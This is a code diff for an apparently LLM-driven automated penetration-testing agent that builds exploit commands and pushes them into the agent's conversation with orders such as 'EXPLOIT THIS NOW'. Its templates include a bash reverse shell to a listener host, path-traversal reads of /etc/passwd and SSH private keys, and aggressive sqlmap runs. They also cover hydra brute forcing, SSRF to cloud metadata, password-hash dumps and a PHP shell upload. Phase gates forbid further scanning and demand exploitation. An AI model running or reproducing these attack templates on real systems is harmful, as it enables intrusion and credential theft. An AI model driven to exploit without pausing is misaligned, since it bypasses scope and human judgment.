+                if not any(ep in cmd_lower for ep in health_endpoints):
+                    return "exploit"
+
+            # curl using credentials/tokens from arsenal → exploit
+            if hasattr(self, 'arsenal') and self.arsenal:
+                for cred in self.arsenal.get("credentials", []):
+                    val = cred.get("value", "")
+                    if val and len(val) > 3 and val.lower() in cmd_lower:
+                        return "exploit"
+                for token in self.arsenal.get("tokens", []):
+                    val = token.get("value", "")
+                    if val and len(val) > 5 and val[:20].lower() in cmd_lower:
+                        return "exploit"
+
+            # curl to a URL matching a tracked vulnerability endpoint → exploit
+            if hasattr(self, 'vulns_found') and self.vulns_found:
+                for vid, v in self.vulns_found.items():
+                    if not isinstance(v, dict):
+                        continue
+                    vuln_target = (v.get("target") or "").lower()
+                    vuln_details = (v.get("details") or "").lower()
+                    if vuln_target and len(vuln_target) > 3 and vuln_target in cmd_lower:
+                        return "exploit"
+                    # Check if URL in details matches
+                    import re as _re_curl
+                    urls_in_details = _re_curl.findall(r'(https?://[^\s]+)', vuln_details)
+                    for u in urls_in_details:
+                        path = u.split("//", 1)[-1].split("/", 1)[-1] if "/" in u.split("//", 1)[-1] else ""
+                        if path and len(path) > 3 and path in cmd_lower:
+                            return "exploit"
+
             # ── Profile-controlled curl classification ──
             # In relaxed/unleashed mode, classify auth curls and POST curls as exploit
             if self.classify_auth_curl_as_exploit:
@@ -4566,6 +6610,9 @@ Continue the assessment - provide the next commands."""
         if "/rest/user/login" in text or "/api/users/login" in text:
             return True
         if "bearer " in text or "authorization:" in text or "jwt" in text:
+            return True
+        # Generic web-session setup (DVWA-style, classic forms)
+        if any(tok in text for tok in ("login", "user_token", "phpsessid", "cookies.txt", "--cookie", " -b ", " -c ")):
             return True
 
         if "xss" in focus:
@@ -4659,9 +6706,13 @@ Continue the assessment - provide the next commands."""
 
         return msg
 
-    def _auto_pivot_after_proof(self) -> Optional[str]:
-        """Generate pivot message after successful exploitation proof. Called from _mark_vuln_proven."""
-        proven_vuln = self.vulns_found.get(self.current_vuln_focus_id, {})
+    def _auto_pivot_after_proof(self, proven_id: str) -> Optional[str]:
+        """Generate pivot message after successful exploitation proof. Called from _mark_vuln_proven.
+
+        NOTE: In _mark_vuln_proven we may clear current_vuln_focus_id; use the explicit proven_id
+        to avoid mis-reporting the "last proven" vuln.
+        """
+        proven_vuln = self.vulns_found.get(proven_id, {}) if proven_id else {}
         proven_type = proven_vuln.get("type", "unknown")
         proven_target = proven_vuln.get("target", "unknown")
 
@@ -4746,6 +6797,134 @@ Continue the assessment - provide the next commands."""
         return result
 
     # ── End Spec 009 helpers ─────────────────────────────────────────────────
+
+    def _hard_block_scan(self, cmd: str) -> Optional[str]:
+        """Hard-block scan commands (nmap/masscan/nikto) after N runs per target.
+        Returns a block message if the scan should be blocked, None otherwise."""
+        cmd_lower = (cmd or "").lower().strip()
+        scan_tools = ("nmap", "masscan", "nikto")
+        first_word = cmd_lower.split()[0].split("/")[-1] if cmd_lower.split() else ""
+        if first_word not in scan_tools:
+            return None
+
+        # Extract target from the command (best-effort: look for IPs, hostnames)
+        import re
+        # Match IP addresses or hostnames in the command
+        target_key = "unknown"
+        ip_match = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', cmd_lower)
+        if ip_match:
+            target_key = ip_match[0]
+        elif self.target:
+            # Use the primary target as key
+            target_key = self.target.split(":")[0].strip()
+
+        count = self.scan_counts.get(target_key, 0) + 1
+        self.scan_counts[target_key] = count
+
+        if count > self.max_scans_per_target:
+            self._log(f"🚫 HARD BLOCK: {first_word} against {target_key} blocked (scan #{count}, limit={self.max_scans_per_target})", "WARN")
+            # Build list of unproven vulns to guide the agent
+            unproven_vulns = []
+            for vid, v in self.vulns_found.items():
+                if isinstance(v, dict) and not v.get("exploited") and not v.get("not_exploitable_reason"):
+                    unproven_vulns.append(f"  - {v.get('type', '?')} at {v.get('target', '?')}")
+            vuln_list = "\n".join(unproven_vulns[:5]) if unproven_vulns else "  (none tracked yet — analyze existing scan results)"
+            return (
+                f"🚫 SCAN BLOCKED: You have already run {self.max_scans_per_target} scans against {target_key}. "
+                f"No more {first_word} scans allowed.\n\n"
+                f"You MUST exploit what you've already found. Known vulnerabilities:\n{vuln_list}\n\n"
+                f"REQUIRED: Pick a vulnerability above and run an exploit command (sqlmap, curl with payload, etc.)"
+            )
+        return None
+
+    def _generate_auto_exploit_command(self, vuln_type: str, target: str, details: str = "") -> Optional[str]:
+        """Generate a concrete exploit command for common vulnerability types.
+        Returns a bash command string or None if no template matches."""
+        vt = (vuln_type or "").lower()
+        det = (details or "").lower()
+        tgt = target or "TARGET"
+
+        # Extract a target URL from details if present, but avoid tool banner URLs
+        # (e.g., https://sqlmap.org) that can appear in stdout.
+        import re
+        tgt_host = str(tgt).split(":")[0].lower()
+        url = f"http://{tgt}" if not str(tgt).lower().startswith("http") else str(tgt)
+        try:
+            candidates = re.findall(r"(https?://[^\s'\"`]+)", details or "")
+            candidates = [u.rstrip(").,;]\"'") for u in candidates]
+            ignore_domains = (
+                "sqlmap.org",
+                "nmap.org",
+                "exploit-db.com",
+                "www.exploit-db.com",
+                "github.com",
+                "kali.org",
+                "metasploit.com",
+            )
+            chosen = None
+            for u in candidates:
+                ul = u.lower()
+                if tgt_host and tgt_host in ul:
+                    chosen = u
+                    break
+            if not chosen:
+                for u in candidates:
+                    ul = u.lower()
+                    if any(dom in ul for dom in ignore_domains):
+                        continue
+                    chosen = u
+                    break
+            if chosen:
+                url = chosen
+        except Exception:
+            pass
+
+        if "sql injection" in vt or "sqli" in vt:
+            ul = url.lower()
+            # Juice Shop login SQLi is typically JSON POST.
+            if "rest/user/login" in ul:
+                return (
+                    f'sqlmap -u "{url}" '
+                    f'--headers="Content-Type: application/json" '
+                    f'--data=\'{{"email":"*","password":"*"}}\' '
+                    f'--batch --dbs --risk=3 --level=5'
+                )
+            return f'sqlmap -u "{url}" --batch --dbs --risk=3 --level=5'
+        elif "command injection" in vt or "cmdi" in vt or "os command" in vt:
+            listener_host = os.getenv("REVERSE_SHELL_HOST", "127.0.0.1")
+            listener_port = self.container_ports[0] if self.container_ports else os.getenv("REVERSE_SHELL_PORT", "4444")
+            return (
+                f'curl -s "{url}" --data "cmd=; id" && '
+                f'curl -s "{url}" --data \'cmd=; bash -c "bash -i >& /dev/tcp/{listener_host}/{listener_port} 0>&1"\''
+            )
+        elif "lfi" in vt or "local file inclusion" in vt or "path traversal" in vt or "directory traversal" in vt:
+            return f'curl -s "{url}/../../../../etc/passwd" && curl -s "{url}/../../../../home/*/.ssh/id_rsa"'
+        elif "credential" in vt or "creds" in vt or "password" in vt:
+            host = tgt.split(":")[0]
+            return f'sshpass -p "admin" ssh -o StrictHostKeyChecking=no admin@{host} "id && whoami"'
+        elif "default credential" in vt or "weak password" in vt or "default password" in vt:
+            return f'curl -s -X POST "{url}/login" -H "Content-Type: application/json" -d \'{{"username":"admin","password":"admin"}}\''
+        elif "mysql" in vt or "mariadb" in vt:
+            host = tgt.split(":")[0]
+            return f'mysql -h {host} -u root --password="" -e "SHOW DATABASES; SELECT user,authentication_string FROM mysql.user;" 2>/dev/null || mysql -h {host} -u root -e "SHOW DATABASES; SELECT user,password FROM mysql.user;"'
+        elif "postgres" in vt or "postgresql" in vt:
+            host = tgt.split(":")[0]
+            return f'PGPASSWORD=postgres psql -h {host} -U postgres -c "\\l" -c "SELECT usename,passwd FROM pg_shadow;" 2>/dev/null'
+        elif "xss" in vt or "cross-site scripting" in vt:
+            return f'curl -s "{url}" -d "q=<script>alert(1)</script>" && echo "--- XSS payload sent, check response for reflection ---"'
+        elif "file upload" in vt or "unrestricted upload" in vt:
+            return f'curl -s -X POST "{url}" -F "file=@/tmp/shell.php;type=image/png" -H "Content-Type: multipart/form-data"'
+        elif "ssrf" in vt:
+            return f'curl -s "{url}?url=http://127.0.0.1:6379/info" && curl -s "{url}?url=http://169.254.169.254/latest/meta-data/"'
+        elif "ftp" in vt or "anonymous ftp" in vt:
+            host = tgt.split(":")[0]
+            return f'wget -r --no-passive ftp://anonymous:anonymous@{host}/ -P /tmp/ftp_dump/ 2>&1 | head -50'
+        elif "ssh" in vt:
+            host = tgt.split(":")[0]
+            return f'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{host} -t 4 -f'
+        elif "information disclosure" in vt or "sensitive data" in vt:
+            return f'curl -s "{url}" -o /tmp/evidence_disclosure.txt && head -100 /tmp/evidence_disclosure.txt'
+        return None
 
     def _scan_loop_detected(self) -> Optional[str]:
         """Detect when the agent is stuck enumerating instead of exploiting."""
@@ -4842,6 +7021,10 @@ Continue the assessment - provide the next commands."""
                 return
 
         target = resolved_target
+        try:
+            details = self._redact_sensitive(details or "")
+        except Exception:
+            details = details or ""
         vuln_id = f"{vuln_type}_{target}".lower().replace(" ", "_")
         if vuln_id not in self.vulns_found:
             self.vulns_found[vuln_id] = {
@@ -4862,6 +7045,10 @@ Continue the assessment - provide the next commands."""
             }
             self._log(f"📍 VULN TRACKED: {vuln_type} at {target} - MUST EXPLOIT", "INFO")
             self._save_vuln_tracker()
+            self.force_exploit_next = True
+            self.phase_force_exploit = True
+            self._advance_phase("EXPLOITATION")
+            self.current_vuln_focus_id = vuln_id
 
             # Spec 009: Queue for immediate exploitation
             if vuln_id not in self.triggered_vuln_ids:
@@ -4875,6 +7062,24 @@ Continue the assessment - provide the next commands."""
                         self.all_vulns_resolved = False
                         self.exploit_pipeline_active = True
 
+            # Auto exploit chains: generate and inject exploit command immediately
+            if self.auto_exploit_chains:
+                try:
+                    exploit_cmd = self._generate_auto_exploit_command(vuln_type, target, details)
+                    if exploit_cmd:
+                        self._log(f"🔥 AUTO-EXPLOIT CHAIN: Injecting exploit for {vuln_type} → {exploit_cmd[:100]}", "INFO")
+                        self.conversation.append({
+                            "role": "user",
+                            "content": (
+                                f"🔥 EXPLOIT THIS NOW — {vuln_type} found at {target}!\n\n"
+                                f"Vulnerability details: {details[:300]}\n\n"
+                                f"EXECUTE THIS COMMAND IMMEDIATELY:\n```bash\n{exploit_cmd}\n```\n\n"
+                                f"Do NOT run more scans. Exploit this vulnerability and capture evidence."
+                            )
+                        })
+                except Exception as _auto_ex:
+                    self._log(f"Auto-exploit chain generation failed: {_auto_ex}", "WARN")
+
     def _mark_vuln_exploited(self, vuln_type: str, evidence: str):
         """Mark a vulnerability as successfully exploited"""
         if self.focus_vuln_keywords and not self._focus_allows_vuln(vuln_type or ""):
@@ -4884,7 +7089,9 @@ Continue the assessment - provide the next commands."""
         if getattr(self, "enforce_exploit_proof", False):
             for vuln_id, vuln in self.vulns_found.items():
                 if vuln_type.lower() in vuln_id.lower() and isinstance(vuln, dict) and not vuln.get("exploited"):
-                    vuln["claimed_exploit_evidence"] = (evidence or "")[:500]
+                    # Strip LLM reasoning before storing claimed evidence
+                    cleaned = self._strip_llm_reasoning(evidence or "")
+                    vuln["claimed_exploit_evidence"] = (cleaned or "")[:500]
                     self._save_vuln_tracker()
                     return False
             return False
@@ -4947,6 +7154,671 @@ Continue the assessment - provide the next commands."""
         text = (vuln_type or "").lower()
         return any(k in text for k in self.focus_vuln_keywords)
 
+    def _sync_structured_findings_from_vuln_tracker(self) -> None:
+        """Mirror vuln tracker into a stable JSON-list findings store."""
+        try:
+            existing_attempts = {}
+            for item in self.structured_findings:
+                if isinstance(item, dict) and item.get("id"):
+                    existing_attempts[item["id"]] = int(item.get("exploit_attempts") or 0)
+
+            normalized = []
+            for vid, v in (self.vulns_found or {}).items():
+                if not isinstance(v, dict):
+                    continue
+                attempts = int(v.get("attempt_count") or 0)
+                attempts = max(attempts, int(existing_attempts.get(vid, 0)))
+                normalized.append(
+                    {
+                        "id": vid,
+                        "type": v.get("type", "unknown"),
+                        "target": v.get("target", self.target or "unknown"),
+                        "details": self._redact_sensitive(v.get("details", "") or ""),
+                        "severity": self._estimate_vuln_severity(v.get("type", "")),
+                        "exploited": bool(v.get("exploited")),
+                        "exploit_attempts": attempts,
+                        "not_exploitable_reason": v.get("not_exploitable_reason", ""),
+                    }
+                )
+            normalized.sort(key=lambda f: (f.get("exploited", False), str(f.get("id", ""))))
+            self.structured_findings = normalized
+        except Exception:
+            pass
+
+    def _save_structured_findings(self) -> None:
+        try:
+            with open(self.findings_store_path, "w") as f:
+                json.dump(self.structured_findings, f, indent=2)
+        except Exception:
+            pass
+
+    def _get_unexploited_findings(self) -> List[Dict[str, Any]]:
+        findings = []
+        for f in (self.structured_findings or []):
+            if not isinstance(f, dict):
+                continue
+            if f.get("exploited"):
+                continue
+            if (f.get("not_exploitable_reason") or "").strip():
+                continue
+            findings.append(f)
+        return findings
+
+    def _is_scan_like_command(self, cmd: str) -> bool:
+        text = (cmd or "").strip().lower()
+        if not text:
+            return False
+        scan_tools = (
+            "nmap", "masscan", "nikto", "gobuster", "dirb", "dirsearch", "ffuf",
+            "feroxbuster", "whatweb", "nuclei", "amass", "subfinder", "assetfinder",
+        )
+        first_word = text.split()[0].split("/")[-1] if text.split() else ""
+        if first_word in scan_tools:
+            return True
+        return False
+
+    def _build_stuck_fallback_strategies(self) -> str:
+        return (
+            "Fallback strategies when stuck:\n"
+            "1. Switch tool family: scanner -> manual payloads (`curl`, raw HTTP)\n"
+            "2. Reuse extracted creds/tokens against new endpoints/services\n"
+            "3. Mutate payload encoding/case/order to bypass filters\n"
+            "4. Write a custom Python exploit script for the exact endpoint\n"
+            "5. Pivot to post-exploit data extraction (`/etc/passwd`, DB tables, secrets)\n"
+            "6. If one vuln fails 3 attempts, pivot to the next tracked vuln"
+        )
+
+    def _build_runtime_enforcement_message(self) -> str:
+        unexploited = self._get_unexploited_findings()
+        hold_active = self._post_proof_hold_active()
+
+        if hold_active:
+            tgt = self.post_proof_hold_target or (self.target or "unknown")
+            vid = self.post_proof_hold_vuln_id or "unknown"
+            try:
+                actions = int(self.post_proof_hold_actions or 0)
+            except Exception:
+                actions = 0
+            try:
+                min_actions = int(self.post_proof_hold_min_actions or 0)
+            except Exception:
+                min_actions = 0
+            scan_line = (
+                f"POST-PROOF HOLD ACTIVE for **{tgt}** (vuln id: {vid}). "
+                f"STOP scanning/pivoting. Deepen impact now. (actions={actions}/{min_actions})"
+            )
+        elif unexploited:
+            scan_line = f"You have {len(unexploited)} UNEXPLOITED vulns. STOP SCANNING. EXPLOIT NOW."
+        else:
+            scan_line = (
+                "You have 0 tracked unexploited vulns. Targeted recon/vuln discovery is allowed, "
+                "but the moment you find a vuln your NEXT action MUST be exploitation."
+            )
+        lines = [
+            self.runtime_context_prefix,
+            "",
+            f"Phase: {self.phase_current} ({self.phase_steps.get(self.phase_current, 0)}/{self.phase_limits.get(self.phase_current, 0)} steps)",
+            scan_line,
+        ]
+        if unexploited or hold_active:
+            items = list(unexploited[:5]) if unexploited else []
+            if not items and hold_active and self.post_proof_hold_vuln_id:
+                # Include the hold vuln for clarity even if it is already marked exploited.
+                for f in (self.structured_findings or []):
+                    if isinstance(f, dict) and str(f.get("id")) == str(self.post_proof_hold_vuln_id):
+                        items = [f]
+                        break
+                if not items:
+                    items = [
+                        {
+                            "id": self.post_proof_hold_vuln_id,
+                            "type": "post-proof deepening",
+                            "target": self.post_proof_hold_target or (self.target or "unknown"),
+                            "exploit_attempts": int(self.post_proof_hold_actions or 0),
+                            "severity": "high",
+                        }
+                    ]
+
+            for item in items[:5]:
+                lines.append(
+                    f"- [{item.get('id')}] {item.get('type')} @ {item.get('target')} "
+                    f"(attempts={item.get('exploit_attempts', 0)}, severity={item.get('severity', 'unknown')})"
+                )
+            lines.append("Next action MUST be exploitation. If a vuln fails 3 attempts, pivot to the next vuln.")
+        lines.append("")
+        lines.append(self._build_stuck_fallback_strategies())
+        return "\n".join(lines)
+
+    def _inject_runtime_enforcement_context(self) -> None:
+        try:
+            filtered = []
+            for msg in self.conversation:
+                content = msg.get("content", "")
+                if msg.get("role") == "user" and isinstance(content, str) and content.startswith(self.runtime_context_prefix):
+                    continue
+                filtered.append(msg)
+            self.conversation = filtered
+            self.conversation.append({"role": "user", "content": self._build_runtime_enforcement_message()})
+        except Exception:
+            pass
+
+    def _advance_phase(self, new_phase: str) -> None:
+        if new_phase in self.phase_order:
+            self.phase_current = new_phase
+
+    def _enforce_phase_gate_before_llm(self) -> Optional[str]:
+        """Update phase counters and return a gate warning when limits are hit.
+
+        Budgets are enforced per LLM call. Once a phase budget is exhausted, avoid
+        spamming the same warning every subsequent iteration (prompt pollution).
+        """
+        try:
+            unexploited = self._get_unexploited_findings()
+            proven_exists = any(
+                isinstance(v, dict) and (v.get("exploited") or v.get("proof"))
+                for v in self.vulns_found.values()
+            )
+
+            if self.phase_current in ("RECON", "VULN_DISCOVERY") and unexploited:
+                self._advance_phase("EXPLOITATION")
+            elif self.phase_current == "EXPLOITATION":
+                if not unexploited and proven_exists:
+                    self._advance_phase("POST_EXPLOIT")
+
+            phase = self.phase_current
+            limit = int(self.phase_limits.get(phase, 0))
+            if limit <= 0:
+                return None
+            steps = int(self.phase_steps.get(phase, 0))
+            if steps >= limit:
+                # Budget already exhausted for this phase; don't spam.
+                return None
+            steps += 1
+            self.phase_steps[phase] = steps
+            if steps < limit:
+                return None
+
+            limit_hit_phase = phase
+            if limit_hit_phase in ("RECON", "VULN_DISCOVERY"):
+                self._advance_phase("EXPLOITATION")
+            elif limit_hit_phase == "EXPLOITATION":
+                # Only advance out of exploitation if nothing remains unresolved.
+                if not unexploited and proven_exists:
+                    self._advance_phase("POST_EXPLOIT")
+            elif limit_hit_phase == "POST_EXPLOIT":
+                # Post-exploit is best-effort; once budget is exhausted we simply stop pushing extra work here.
+                pass
+
+            unresolved_after_gate = self._get_unexploited_findings()
+            self.force_exploit_next = bool(unresolved_after_gate)
+            self.phase_force_exploit = bool(unresolved_after_gate)
+            self._log(
+                f"PHASE GATE HIT: {limit_hit_phase} hit step budget ({limit}). "
+                f"current={self.phase_current}, unresolved={len(unresolved_after_gate)}",
+                "WARN",
+            )
+            if unresolved_after_gate:
+                return "⚠️ STOP scanning. EXPLOIT now."
+            if limit_hit_phase in ("RECON", "VULN_DISCOVERY"):
+                return "⚠️ STOP scanning. Attempt exploitation on your best lead now."
+            if limit_hit_phase == "POST_EXPLOIT":
+                return "⚠️ Post-exploit step budget hit. Wrap up evidence and generate report."
+            return None
+        except Exception:
+            return None
+
+    def _build_playbook_commands(self, finding: Dict[str, Any]) -> List[str]:
+        vtype = str(finding.get("type") or "").lower()
+        target = str(finding.get("target") or self.target or "").strip()
+        details = str(finding.get("details") or "")
+        target_host = target.split(":")[0] if target else (self.target.split(":")[0] if self.target else "127.0.0.1")
+        base_url = f"http://{target}" if target and not target.startswith("http") else (target or f"http://{target_host}")
+
+        # Extract a useful vuln URL from details, but avoid tool/homepage URLs
+        # that often appear in banners (e.g., https://sqlmap.org, https://nmap.org).
+        vuln_url = base_url
+        try:
+            url_candidates = re.findall(r"(https?://[^\s'\"`]+)", details or "")
+            # Strip common trailing punctuation that sneaks into logs.
+            url_candidates = [u.rstrip(").,;]\"'") for u in url_candidates]
+            ignore_domains = (
+                "sqlmap.org",
+                "nmap.org",
+                "exploit-db.com",
+                "www.exploit-db.com",
+                "github.com",
+                "kali.org",
+                "metasploit.com",
+            )
+            target_tokens = {str(target_host).lower()}
+            if self.target:
+                target_tokens.add(str(self.target).split(":")[0].lower())
+            for u in url_candidates:
+                ul = u.lower()
+                if any(tok and tok in ul for tok in target_tokens):
+                    vuln_url = u
+                    break
+            else:
+                for u in url_candidates:
+                    ul = u.lower()
+                    if any(dom in ul for dom in ignore_domains):
+                        continue
+                    vuln_url = u
+                    break
+        except Exception:
+            vuln_url = base_url
+
+        listener_host = os.getenv("REVERSE_SHELL_HOST", "127.0.0.1")
+        listener_port = self.container_ports[0] if self.container_ports else os.getenv("REVERSE_SHELL_PORT", "4444")
+
+        creds = []
+        for item in self.arsenal.get("credentials", []):
+            val = str(item.get("value", ""))
+            if ":" in val:
+                user, pwd = val.split(":", 1)
+                if user and pwd:
+                    creds.append((user.strip(), pwd.strip()))
+        cmd_list: List[str] = []
+        is_sqli = ("sql injection" in vtype) or ("sqli" in vtype) or ("sql" in vtype and "nosql" not in vtype)
+        is_cmdi = any(marker in vtype for marker in ("command injection", "cmdi", "remote code execution", "rce", "os command"))
+        is_lfi = any(marker in vtype for marker in ("lfi", "traversal", "file inclusion", "path traversal"))
+        is_cred = any(marker in vtype for marker in ("credential", "creds", "default credential", "weak credential", "password"))
+
+        if is_sqli:
+            ul = (vuln_url or "").lower()
+            if "rest/user/login" in ul:
+                # JuiceShop login is JSON POST; avoid brittle escaping in --data.
+                login_data = json.dumps({"email": "admin' OR 1=1--*", "password": "x"})
+                cmd_list.append(
+                    f"sqlmap -u {shlex.quote(vuln_url)} --method POST "
+                    f"--headers={shlex.quote('Content-Type: application/json')} "
+                    f"--data={shlex.quote(login_data)} "
+                    f"--batch --dbs --risk=3 --level=5"
+                )
+            else:
+                cmd_list.append(f'sqlmap -u "{vuln_url}" --batch --dbs --risk=3 --level=5')
+        if is_cmdi:
+            cmd_list.append(f'curl -s "{vuln_url}" --data "cmd=; id"')
+            cmd_list.append(
+                f'curl -s "{vuln_url}" --data \'cmd=; bash -c "bash -i >& /dev/tcp/{listener_host}/{listener_port} 0>&1"\''
+            )
+        if is_lfi:
+            cmd_list.append(f'curl -s "{vuln_url}/../../../../etc/passwd"')
+            cmd_list.append(f'curl -s "{vuln_url}/../../../../home/{os.getenv("TARGET_USER", "*")}/.ssh/id_rsa"')
+        if is_cred or ("ssh" in vtype) or ("remote service" in vtype):
+            for user, pwd in creds[:1]:
+                cmd_list.append(f'sshpass -p \'{pwd}\' ssh -o StrictHostKeyChecking=no {user}@{target_host} "id && whoami"')
+        return cmd_list[:3]
+
+    def _inject_playbook_autofire(self) -> None:
+        """Inject concrete exploit commands for unexploited findings."""
+        try:
+            pending = self._get_unexploited_findings()
+            if not pending:
+                return
+            pending.sort(key=lambda x: (int(x.get("exploit_attempts", 0)), str(x.get("id", ""))))
+            finding = pending[0]
+            if int(finding.get("exploit_attempts", 0)) > 0:
+                return
+            commands = self._build_playbook_commands(finding)
+            if not commands:
+                return
+            body = [
+                f"🚀 AUTO-FIRE PLAYBOOK: {finding.get('type')} at {finding.get('target')}",
+                "Execute this now:",
+            ]
+            for cmd in commands:
+                body.append(f"```bash\n{cmd}\n```")
+            body.append("Do not scan. Exploit and return proof.")
+            self.conversation.append({"role": "user", "content": "\n".join(body)})
+            self.force_exploit_next = True
+            self.current_vuln_focus_id = str(finding.get("id") or self.current_vuln_focus_id)
+        except Exception:
+            pass
+
+    def _build_structured_context_summary(self) -> str:
+        """Create an explicit state snapshot for trim-safe context."""
+        ports = []
+        try:
+            port_re = re.compile(r"(\d{1,5})/tcp\s+open\s+([a-zA-Z0-9._-]+)")
+            for ex in self.executions[-200:]:
+                blob = f"{ex.stdout or ''}\n{ex.stderr or ''}"
+                for m in port_re.findall(blob):
+                    item = f"- {m[0]}/tcp {m[1]}"
+                    if item not in ports:
+                        ports.append(item)
+        except Exception:
+            pass
+
+        creds = []
+        for c in self.arsenal.get("credentials", [])[:10]:
+            creds.append(f"- {c.get('value', '?')}")
+        for t in self.arsenal.get("tokens", [])[:5]:
+            val = str(t.get("value", ""))
+            creds.append(f"- token:{val[:30]}{'...' if len(val) > 30 else ''}")
+
+        vulns = []
+        for f in self.structured_findings[:20]:
+            status = "exploited" if f.get("exploited") else "unexploited"
+            vulns.append(f"- {f.get('type')} @ {f.get('target')} ({status}, attempts={f.get('exploit_attempts', 0)})")
+
+        failed = []
+        for v in self.vulns_found.values():
+            if not isinstance(v, dict):
+                continue
+            for a in (v.get("attempts", []) or [])[-2:]:
+                status = str(a.get("status", "")).lower().strip()
+                success = a.get("success", None)
+                exit_code = a.get("exit_code", None)
+                is_failed = (status == "failed") or (success is False) or (isinstance(exit_code, int) and exit_code != 0)
+                if is_failed:
+                    snippet = str(a.get("error") or a.get("output") or a.get("evidence") or "")[:120]
+                    failed.append(f"- {v.get('type', '?')}: {snippet}")
+
+        parts = ["**STRUCTURED CONTEXT SUMMARY (pre-trim)**", "## OPEN PORTS"]
+        parts.extend(ports[:20] or ["- none recorded"])
+        parts.append("## CREDENTIALS")
+        parts.extend(creds[:20] or ["- none recorded"])
+        parts.append("## VULNERABILITIES")
+        parts.extend(vulns[:20] or ["- none recorded"])
+        parts.append("## FAILED APPROACHES")
+        parts.extend(failed[:20] or ["- none recorded"])
+        return "\n".join(parts)[:3000]
+
+    def _infer_access_level_from_proof(self, vuln_type: str, proof: str) -> str:
+        """Infer a coarse access level label from proof text (best-effort)."""
+        pl = (proof or "").lower()
+        vt = (vuln_type or "").lower()
+
+        # OS-level proof (highest confidence)
+        if "nt authority\\system" in pl or "nt authority/system" in pl:
+            return "SYSTEM"
+        if re.search(r"\buid=0\b", pl) or "root:x:0:0" in pl:
+            return "root"
+
+        # App-level privilege proof
+        if "\"role\":\"admin\"" in pl or "isadmin\":true" in pl or "role=admin" in pl:
+            return "admin"
+
+        # Token/session indicates authenticated access even if we don't know role
+        if any(tok in pl for tok in ("\"token\"", "set-cookie", "phpsessid", "jsessionid", "bearer ")):
+            return "authenticated"
+
+        # Database-only proof (SQLi dumps) isn't a shell, but still "access"
+        if "sql" in vt or "sqli" in vt:
+            return "database"
+
+        return "user"
+
+    def _extract_email_from_text(self, text: str) -> Optional[str]:
+        try:
+            m = re.search(r"\b[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}\b", text or "")
+            return m.group(0) if m else None
+        except Exception:
+            return None
+
+    def _update_access_json_from_proof(self, vuln_id: str, vuln: Dict[str, Any], proof: str) -> None:
+        """Write/update `access.json` as soon as exploitation proof exists.
+
+        This is the primary signal for the control-plane's `access_gained` live stat.
+        """
+        try:
+            # Load existing if present (schema is intentionally tolerant; older runs may not match).
+            existing: Dict[str, Any] = {}
+            if os.path.exists(self.access_json_path) and os.path.getsize(self.access_json_path) > 0:
+                try:
+                    with open(self.access_json_path, "r") as f:
+                        loaded = json.load(f)
+                    if isinstance(loaded, dict):
+                        existing = loaded
+                except Exception:
+                    existing = {}
+
+            vtype = str((vuln or {}).get("type") or "unknown")
+            target_raw = str((vuln or {}).get("target") or self.target or "unknown")
+            target = self._normalize_target_token(target_raw) or target_raw
+            access_level = self._infer_access_level_from_proof(vtype, proof or "")
+
+            # Derive a base URL for web tokens if we have one in details.
+            base_url = ""
+            try:
+                durl = self._extract_url_from_text(str((vuln or {}).get("details") or ""))
+                if durl:
+                    u = urlparse(durl)
+                    if u.scheme and u.netloc:
+                        base_url = f"{u.scheme}://{u.netloc}"
+            except Exception:
+                base_url = ""
+            if not base_url and target and target not in ("unknown", "target"):
+                base_url = f"http://{target}"
+
+            # Build an access event (token-safe: redact proof snippets)
+            event = {
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+                "iteration": int(self.iteration or 0),
+                "vuln_id": vuln_id,
+                "vuln_type": vtype,
+                "target": target,
+                "access_level": access_level,
+                "method": f"{vtype} proof",
+                "proof_snippet": self._redact_sensitive((proof or "")[:220]),
+            }
+
+            events = existing.get("events") if isinstance(existing.get("events"), list) else []
+            events.append(event)
+            events = events[-25:]
+
+            access_items = existing.get("access") if isinstance(existing.get("access"), list) else []
+
+            # If we have a freshly extracted token/session, record it in access.json for handoff.
+            # NOTE: We intentionally store the full token in the output volume; UI redaction happens server-side.
+            username = self._extract_email_from_text(proof or "") or ("admin" if access_level == "admin" else "user")
+            try:
+                token_candidates = []
+                tgt_lower = (target or "").lower()
+                for t in (self.arsenal or {}).get("tokens", []):
+                    if not isinstance(t, dict):
+                        continue
+                    src = str(t.get("source_command") or "").lower()
+                    if tgt_lower and tgt_lower in src:
+                        token_candidates.append(t)
+                if not token_candidates:
+                    token_candidates = [t for t in (self.arsenal or {}).get("tokens", []) if isinstance(t, dict)]
+                if token_candidates:
+                    tok = token_candidates[-1]
+                    tok_val = str(tok.get("value") or "")
+                    if tok_val and not any(isinstance(a, dict) and a.get("type") == "api_token" and a.get("password") == tok_val for a in access_items):
+                        access_items.append(
+                            {
+                                "type": "api_token",
+                                "service": base_url,
+                                "username": username,
+                                "password": tok_val,
+                                "source": "arsenal.tokens",
+                                "iteration": tok.get("source_iteration"),
+                            }
+                        )
+            except Exception:
+                pass
+
+            # Maintain a stable, minimal top-level shape.
+            existing_out: Dict[str, Any] = {
+                "access_level": existing.get("access_level") or access_level,
+                "events": events,
+                "access": access_items[-20:],
+            }
+            # Promote highest access level observed so far (simple ordering).
+            order = {"SYSTEM": 0, "root": 1, "admin": 2, "authenticated": 3, "database": 4, "user": 5}
+            try:
+                best = existing_out["access_level"]
+                for ev in events:
+                    lvl = ev.get("access_level")
+                    if lvl and order.get(str(lvl), 99) < order.get(str(best), 99):
+                        best = lvl
+                existing_out["access_level"] = best
+            except Exception:
+                pass
+
+            with open(self.access_json_path, "w") as f:
+                json.dump(existing_out, f, indent=2, default=str)
+        except Exception:
+            # Never break the run over access.json best-effort writing.
+            return
+
+    def _activate_post_proof_hold(self, vuln_id: str, target: str) -> None:
+        """After a proof event, require post-exploit deepening actions before pivoting away."""
+        if not self.post_proof_hold_min_actions or self.post_proof_hold_min_actions <= 0:
+            return
+        tgt = self._normalize_target_token(target or "")
+        if not tgt:
+            return
+        self.post_proof_hold_target = tgt
+        self.post_proof_hold_vuln_id = str(vuln_id or "")
+        self.post_proof_hold_actions = 0
+        self.post_proof_hold_blocks = 0
+        self.post_proof_hold_start_iteration = int(self.iteration or 0)
+
+    def _clear_post_proof_hold(self) -> None:
+        self.post_proof_hold_target = None
+        self.post_proof_hold_vuln_id = None
+        self.post_proof_hold_actions = 0
+        self.post_proof_hold_blocks = 0
+        self.post_proof_hold_start_iteration = 0
+
